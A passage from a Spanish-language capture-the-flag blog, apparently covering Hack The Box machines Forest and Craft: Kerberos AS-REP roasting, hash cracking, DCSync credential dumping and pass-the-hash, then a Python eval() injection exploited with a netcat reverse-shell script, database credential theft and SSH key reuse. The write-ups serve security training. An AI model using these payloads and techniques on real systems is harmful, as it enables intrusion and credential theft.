KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [... REDACTED ...] [-] User sebastien doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Dentro del archivo de hashes.asreproast encontramos el hash de uno de los usuarios.\nHASHCAT - KERBEROs Utilizamos hashcat para crackear el hash que obtuvimos con el script de impacket.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -m 18200 pass_forest -o cracked.txt ../rockyou.txt --force hashcat (v5.1.0) starting... nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: ../rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 1 sec Session..........: hashcat Status...........: Cracked Hash.Type........: Kerberos 5 AS-REP etype 23 Hash.Target......: $krb5asrep$23$svc-alfresco@HTB:2f985636440000c102e7...6864af Time.Started.....: Fri Nov 1 02:46:04 2019 (2 secs) Time.Estimated...: Fri Nov 1 02:46:06 2019 (0 secs) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 2181.4 kH/s (9.63ms) @ Accel:256 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 4128768/14344385 (28.78%) Rejected.........: 0/4128768 (0.00%) Restore.Point....: 4079616/14344385 (28.44%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: s9039554h -\u0026gt; ruddsound1 Hardware.Mon.#1..: Temp: 51c Util: 63% Core:1189MHz Mem:2505MHz Bus:4 Started: Fri Nov 1 02:45:56 2019 Stopped: Fri Nov 1 02:46:07 2019 Pass:\n1 $krb5asrep$23$svc-alfresco@HTB:2f985636440000c102e7a67d333b3d24$7b3a05d397f5ea656b6649ef36dfe3b0c9c5be004550dc64da438b19c056b1caf1c1408ad8840c7cb507c5ca040ad1abf3ceea9d68e13f82fb0d18df542343004c4ec202ae4b9b818457cde2a1ffe74bd8cf0bee3795e74fd1410946c1ae5323e00b3cfceda7f26e053eb6c2e3922dce1095812a6071aeee4a000442ae3f86f3676119df60fdf61bb4f287e3317128664557f0fa6f3b745b5f122afa5612b0c8fc398b2869e97240a81dda272f4ff802914b6c7c59cc80fd5e357097dd2848d66b5f346cf6bfe8de21bf5ba0ef2646c559be47ce0af236c2ce1e45afaf6864af:s3rvice SMBMAP Utilizamos las credenciales del usuario svc-alfresco para ver en que SHARENAMES tenemos acceso en el puerto de samba.\nConfirmamos que solo tenemos acceso a NETLOGON y SYSVOL con psexec.\nUser - SVC-ALFRESCO En el reporte del escaneo de nmap vemos un puerto en el que podemos utilizar las credenciales para poder obtener una shell en el puerto de WINRM, utilizamos EVIL-WinRM.\nEvil-WinRM Install: gem install evil-winrm\nPRIVILEGE ESCALATION Utilizamos bloodhound.py para poder obtener la lista de usuarios, permisos de usuarios, grupos de usuarios e importar los datos en bloodhound para ver la ruta que podemos seguir para obtener permisos administrativos utilizando la informacion que nos proporciona bloodhound.\nBooldhound.py Utilizamos las credenciales del usuario svc-alfresco, el dominio y el namesever para obtener los datos.\nComprimimos los archivos en zip.\nBloodhound Importamos los datos que obtuvimos a bloodhound. Nos mostrará un mapa con todos los usuarios disponibles y los grupos de usuarios a los que pertenecen, con los distintos permisos que cada uno tiene, incluso, los permisos que tienen uno sobre otro.\nNos ubicamos en el usuario actual (svc-alfresco) y vemos informacion del usuario, lo que nos interesa es Recehable High Values.\nPodemos ver que el usuario es miembro de varios grupos, y tiene permisos de WriteDACL, que le permiten al usuario modificar permisos de dominio en este caso htb.local y realizar operaciones en DCSync.\nBloodhound nos proporciona cierta informacion que puede ser de utilidad para realizar estas operaciones, para ello nos ubicamos en Writedacl \u0026gt; Help \u0026gt; Abuse Info.\nACLPWN Podemos hacerlo de forma automatizada utilizando esta herramienta, aclpwn permite encontrar y explotar una ruta para obtener privilegios administrativos utilizando los datos obtenidos de bloodhound desde la base de datos.\nRealizamos una busqueda del camino mas cercano:\nLos parametros:\n1 2 3 4 5 6 7 8 -f usuario/computadora (Es el nodo de inicio) -ft user (Especificamos que el nodo inicial es usuario/computadora/dominio/grupo) -t htb.local (El destino al cual deseamos llegar) -tt domain (Especificamos que el destino es usuario/computadora/dominio/grupo) -d htb.local (El Dominio) -du neo4j (Usuario para la base de datos) -dp toor (Contraseña para la base de datos) -dry (Especificamos que no deseamos atacar) Podemos ver que encontro un camino y puede ser explotado.\n1 2 3 4 5 6 7 8 9 10 11 root@kali:~/tools/aclpwn.py# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -dry -du neo4j -dp toor [+] Path found! Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL) [!] Unsupported operation: GetChanges on HTB.LOCAL (Domain) [-] Invalid path, skipping [+] Path found! Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL) Please choose a path [0-1] 1 [+] Path validated, the following modifications are required for exploitation in the current configuration: [-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL [-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO root@kali:~/tools/impacket/examples# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -du neo4j -dp toor -s 10.10.10.161\rPlease supply the password or LM:NTLM hashes of the account you are escalating from: [+] Path found!\rPath [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL)\r[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)\r[-] Invalid path, skipping\r[+] Path found!\rPath [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-\u0026gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-\u0026gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-\u0026gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-\u0026gt;(HTB.LOCAL)\rPlease choose a path [0-1] 1\r[-] Memberof -\u0026gt; continue\r[-] Memberof -\u0026gt; continue\r[-] Memberof -\u0026gt; continue\r[-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL\r[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local\r[-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL\r[+] Re-bind successful\r[-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO\r[+] Dacl modification successful\r[+] Finished running tasks\r[+] Saved restore state to aclpwn-20191130-014547.restore Ahora que que tenemos permisos DCSync podemos utilizar secretsdump.py para obtener los hash de los usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [... REDACTED ...] htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc::: htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3::: htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668::: htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b::: htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7::: htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072::: FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:179967e72ed1faea7d8de2f3c2b5d003::: EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1::: [*] Kerberos keys grabbed krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58 krbtgt:des-cbc-md5:9dd5647a31518ca8 [... REDACTED ...] htb.local\\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161 htb.local\\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a htb.local\\sebastien:des-cbc-md5:702a3445e0d65b58 htb.local\\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5 htb.local\\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad htb.local\\lucinda:des-cbc-md5:a13bb56bd043a2ce htb.local\\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32 htb.local\\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea htb.local\\svc-alfresco:des-cbc-md5:014ac86d0b98294a htb.local\\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f htb.local\\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6 htb.local\\andy:des-cbc-md5:a2ab5eef017fb9da htb.local\\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6 htb.local\\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81 htb.local\\mark:des-cbc-md5:b5dff1f40b8f3be9 htb.local\\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427 htb.local\\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25 htb.local\\santi:des-cbc-md5:4075ad528ab9e5fd FOREST$:aes256-cts-hmac-sha1-96:d409d743b2d787ba4a45692058388533840bb55a4d1fd65f8e345164d2df5078 FOREST$:aes128-cts-hmac-sha1-96:c7306933e272b5b5992f9c9ff688eaa2 FOREST$:des-cbc-md5:c8132fbf73c71fa8 EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6 EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e EXCH01$:des-cbc-md5:8c45f44c16975129 [*] Cleaning up... Logramos obtener los hashes de la mayoria de usuarios, podemos obtener el de un solo usuario, en este caso el que nos interesa es el del usuario administrator.\n1 2 3 4 5 6 7 root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc-user administrator Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: [*] Cleaning up... Utilizamos psexec.py para obtener nuestra flag root.txt y una shell.\nrlwrap psexec.py htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 ","description":"Forest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM. Con BloodHound enumeramos y con Aclpwn obtuvimos privilegios administrativos para luego dumpear los hashes y finalmente realizar Pass-the-Hash para obtener una shell como administrador.","id":172,"section":"posts","tags":["enum4linux","kerberos","smbmap","impacket","evil-winrm","bloodhound","aclpwn"],"title":"Hack The Box - Forest","uri":"https://sckull.github.io/posts/forest/"},{"content":"\rCraft presenta Gogs donde encontramos el codigo fuente y una vulnerabilidad en una API la cual explotamos para ejecutar una shell inversa. Utilizando credenciales de la base de datos nos conectamos a esta y obtuvimos credenciales para realizar movimiento lateral. Con informacion de los repositorios y de la base de datos obtuvimos acceso al siguiente usuario. El repositorio de Infraestructura nos permitio obtener acceso privilegiado con la informacion de Vault.\nInformacion de la Maquina Nombre Craft OS Linux Puntos 30 Dificultad Media IP 10.10.10.110 Maker rotarydrone\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.7, 8.9, 3.8, 6.2, 1.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[6, 10, 1, 9, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 masscan -p1-65535,U:1-65535 10.10.10.110 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-30 06:56:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.110 Discovered open port 443/tcp on 10.10.10.110 Discovered open port 6022/tcp on 10.10.10.110 # Nmap 7.70 scan initiated Tue Jul 30 03:13:35 2019 as: nmap -sV -sC -p 22,443,6022 -o nmap.scan 10.10.10.110 Nmap scan report for 10.10.10.110 Host is up (0.13s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) | ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA) | 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA) |_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519) 443/tcp open ssl/http nginx 1.15.8 |_http-server-header: nginx/1.15.8 |_http-title: About | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US | Not valid before: 2019-02-06T02:25:47 |_Not valid after: 2020-06-20T02:25:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 6022/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-Go | ssh-hostkey: |_ 2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port6022-TCP:V=7.70%I=7%D=7/30%Time=5D3FEE27%P=x86_64-pc-linux-gnu%r(NU SF:LL,C,\u0026#34;SSH-2\\.0-Go\\r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 30 03:14:26 2019 -- 1 IP address (1 host up) scanned in 51.23 seconds HTTPS Visitamos la pagina en HTTPS nos muestra un mensaje que nos habla de una rest API.\nSubdominios Nos movilizamos atravez de las diferentes rutas que nos provee la pagina y encontramos un dominio y dos subdominios, los cuales agregamos a nuestro archivo /etc/hosts.\ncraft.htb\rapi.craft.htb\rgogs.craft.htb https://api.craft.htb/api/ En la pagina de api nos meustra distintas opciones con las cuales podemos interactuar con una interfaz y tambien nos provee diferentes comandos con curl, para hacer solicitudes a la API.\nhttps://gogs.craft.htb/ En la pagina de gogs nos encontramos con la plataforma gogs que permite el gestionamiento de repositorios, dentro de la misma plataforma nos encontramos con un repositorio.\nCRAFT API Analizamos el codigo que se encuentra en el repositorio el cual pertenece a la rest API que nos menciona la pagina principal (craft.htb), contiene toda la estructura de como funciona esta API. Dentro, encontramos que se hizo un cambio a una parte de codigo que pertenece a la creacion de un nuevo brew de la API.\nDicho cambio incluye una porcion de codigo de python que es vulnerable a ejecucion de comandos remota o RCE.\nPorcion de codigo vulnerable especificamente eval():\n1 2 if eval(\u0026#39;%s \u0026gt; 1\u0026#39; % request.json[\u0026#39;abv\u0026#39;]): return \u0026#34;ABV must be a decimal value less than 1.0\u0026#34;, 400 Python Code Injection\nAdemas de eso encontramos un archivo test.py que contiene un usuario y contraseña para generar un token, para luego crear un \u0026lsquo;brew\u0026rsquo; insatisfactorio y satisfactoriamente. El primero contiene un numero con punto decimal mayor a 1 que debe de ser rechazado por la API. El segundo un numero menor a 1 con punto decimal que debe de ser aceptado por la API.\nArchivo test.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #!/usr/bin/env python import requests import json response = requests.get(\u0026#39;https://api.craft.htb/api/auth/login\u0026#39;, auth=(\u0026#39;dinesh\u0026#39;, \u0026#39;4aUh0A8PbVJxgd\u0026#39;), verify=False) json_response = json.loads(response.text) token = json_response[\u0026#39;token\u0026#39;] headers = { \u0026#39;X-Craft-API-Token\u0026#39;: token, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; } # make sure token is valid response = requests.get(\u0026#39;https://api.craft.htb/api/auth/check\u0026#39;, headers=headers, verify=False) print(response.text) # create a sample brew with bogus ABV... should fail. print(\u0026#34;Create bogus ABV brew\u0026#34;) brew_dict = {} brew_dict[\u0026#39;abv\u0026#39;] = \u0026#39;15.0\u0026#39; brew_dict[\u0026#39;name\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;brewer\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;style\u0026#39;] = \u0026#39;bullshit\u0026#39; json_data = json.dumps(brew_dict) response = requests.post(\u0026#39;https://api.craft.htb/api/brew/\u0026#39;, headers=headers, data=json_data, verify=False) print(response.text) # create a sample brew with real ABV... should succeed. print(\u0026#34;Create real ABV brew\u0026#34;) brew_dict = {} brew_dict[\u0026#39;abv\u0026#39;] = \u0026#39;0.15\u0026#39; brew_dict[\u0026#39;name\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;brewer\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;style\u0026#39;] = \u0026#39;bullshit\u0026#39; json_data = json.dumps(brew_dict) response = requests.post(\u0026#39;https://api.craft.htb/api/brew/\u0026#39;, headers=headers, data=json_data, verify=False) print(response.text) Prueba del archivo test.py:\nRCE - Craft API Para poder ejecutar comandos y obtener una shell inversa a travez de la vulnerabilidad que encontramos en el codigo del repositorio vamos a modificar el archivo test.py, agregandole un comando que va a ser ejecutado por la funcion eval(). Agregamos nuestra shell inversa \u0026ldquo;escapando\u0026rdquo; todas los backslash que se encuentran para no tener ningun problema al ejecutarse. Y Ponemos a la escucha nuestra maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #!/usr/bin/env python import requests import json response = requests.get(\u0026#39;https://api.craft.htb/api/auth/login\u0026#39;, auth=(\u0026#39;dinesh\u0026#39;, \u0026#39;4aUh0A8PbVJxgd\u0026#39;), verify=False) json_response = json.loads(response.text) token = json_response[\u0026#39;token\u0026#39;] headers = { \u0026#39;X-Craft-API-Token\u0026#39;: token, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; } # make sure token is valid response = requests.get(\u0026#39;https://api.craft.htb/api/auth/check\u0026#39;, headers=headers, verify=False) print(response.text) a = \u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;rm \\/tmp\\/f;mkfifo \\/tmp\\/f;cat \\/tmp\\/f|\\/bin\\/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.184 8878 \u0026gt;\\/tmp\\/f\u0026#39;).read()\u0026#34; # create a sample brew with real ABV... should succeed. print(\u0026#34;Create real ABV brew\u0026#34;) brew_dict = {} brew_dict[\u0026#39;abv\u0026#39;] = a brew_dict[\u0026#39;name\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;brewer\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;style\u0026#39;] = \u0026#39;bullshit\u0026#39; json_data = json.dumps(brew_dict) response = requests.post(\u0026#39;https://api.craft.htb/api/brew/\u0026#39;, headers=headers, data=json_data, verify=False) print(response.text) Al ejecutar el script obtenemos una shell inversa:\nMYSQL - Dump Credentials Dentro del sistema de archivos encontramos los mismos archivos pertenecientes al repositorio, al ejecutar el archivo de dbtest.py obtenemos una respuesta de la base de datos MySQL.\nArchivos:\nPrueba dbtest.py\nArchivo settings.py con credenciales de la base de datos:\nPara poder obtener Credenciales que se encuentran en la base de datos utilizamos nuevamente el repositorio, ya que en este se encuentra el modelo de las tablas de la base de datos, brew y user, por lo que podemos obtener facilmente las columnas y el nombre de las tablas.\ncraft_api/database/models.py\nPara realizar un query a la base de datos utilizamos y modificamos el archivo dbtest.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!/usr/bin/env python import pymysql import sys from craft_api import settings connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor) try: with connection.cursor() as cursor: sql = sys.argv[1] cursor.execute(sql) result = cursor.fetchall() print(result) finally: connection.close() Teniendo nuestro archivo listo utilizamos el siguiente query para obtener los datos:\n1 SELECT * FROM user Archivo dbtest.py modificado:\nObtenemos las credenciales que estan dentro de la base de datos, una de ellas ya la teniamos dentro del script test.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [ { \u0026#39;id\u0026#39;:1, \u0026#39;username\u0026#39;:\u0026#39;dinesh\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;4aUh0A8PbVJxgd\u0026#39; }, { \u0026#39;id\u0026#39;:4, \u0026#39;username\u0026#39;:\u0026#39;ebachman\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;llJ77D8QFkLPQB\u0026#39; }, { \u0026#39;id\u0026#39;:5, \u0026#39;username\u0026#39;:\u0026#39;gilfoyle\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;ZEU3N8WNM2rh4T\u0026#39; } ] USER gilfoyle - SHELL SSH Obtuvimos las credenciales de 3 \u0026ldquo;usuarios\u0026rdquo;, ninguno de ellos funciona en el servicio de SSH, pero dos de ellos si funcionan en la plataforma Gogs.\nPor un lado tenemos al usuario dinesh quien puede realizar cambios dentro del codigo del repositorio de la API de craft.\nCon el usuario gilfoyle nos muestra un repositorio más al del usuario dinesh este nos muestra como esta la infraestructura del \u0026lsquo;servidor\u0026rsquo;. Entre las cosas que tiene este repositorio encontramos el \u0026lsquo;craft-flask\u0026rsquo; el cual contiene la informacion para la Shell de privilegios bajos con la que pudimos obtener las credenciales, y, tambien informacion del servidor nginx, mysql, vault y ssh.\nEn la carpeta .ssh encontramos la clave publica y privada del usuario gilfoyle perteneciente al servicio de SSH, utilizamos dicha clave para obtener una shell SSH. Al utilizar la clave nos pide una frase utilizamos la contraseña (ZEU3N8WNM2rh4T) que encontramos en la base de datos de este usuario.\nObtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Nuevamente volvemos al repositorio donde encontramos la infraestructura que tiene el servidor, dentro, encontramos en la carpeta vault la configuracion de esta plataforma, esta plataforma da el acceso y control de contraseñas, certificados, claves de APIs, contraseñas, etc.\n1 2 3 4 5 6 7 8 9 10 storage \u0026#34;file\u0026#34; { path = \u0026#34;/vault/data\u0026#34; } ui = false listener \u0026#34;tcp\u0026#34; { address = \u0026#34;0.0.0.0:8200\u0026#34; tls_cert_file = \u0026#34;/vault/pki/vault.craft.htb.crt\u0026#34; tls_key_file = \u0026#34;/vault/pki/vault.craft.htb.key\u0026#34; tls_min_version = \u0026#34;tls12\u0026#34; } Revisamos la documentacion de esta plataforma y las opciones que contiene este archivo. Encontramos que la plataforma esta corriendo en el puerto 8200 y su interfaz grafica (ui) esta desactivada. Dentro de la maquina especificamente en el archivo /etc/hosts encontramos que la plataforma esta configurada en la ip y dominio:\n1 172.20.0.2 vault.craft.htb Comprobamos que la interfaz grafica este desactivada traemos 172.20.0.2 con el puerto 8200 localmente:\n1 ssh -L 8200:172.20.0.2:8200 gilfoyle@10.10.10.110 -i gilfoyle_id_rsa SSH Local Pudimos comprobar que la plataforma esta desactivada graficamente.\nROOT - One Time Password One time password permite a algun usuario crear una contraseña cada vez que lo desee conectarse en el servicio SSH mediante comandos. De igual forma dentro del repositorio encontramos un archivo llamado secret.sh el cual contiene una configuracion para activar ssh, crear un Rol con el usuario root con las IP que se representen dentro de cidr_list.\nOne Time SSH\n1 2 3 4 5 6 vault secrets enable ssh vault write ssh/roles/root_otp \\ key_type=otp \\ default_user=root \\ cidr_list=0.0.0.0/0 Utilizamos el archivo secrets.sh, lo 